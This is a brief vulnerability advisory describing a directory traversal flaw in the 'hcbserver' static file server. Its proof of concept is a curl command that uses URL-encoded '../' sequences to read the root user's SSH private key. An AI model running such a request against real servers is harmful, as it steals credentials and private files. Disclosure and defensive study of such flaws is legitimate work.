# Overview

`hcbserver` is a static file server.

This package is vulnerable to a directory traversal issue. By placing "../" in the UR, a malicious actor can use this vulnerability to access files outside of the intended directory root, which may result in the disclosure of private files on the vulnerable system.


# Proof of Concept

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
```
Note: `%2e` is the URL encoded version of `.` (dot).
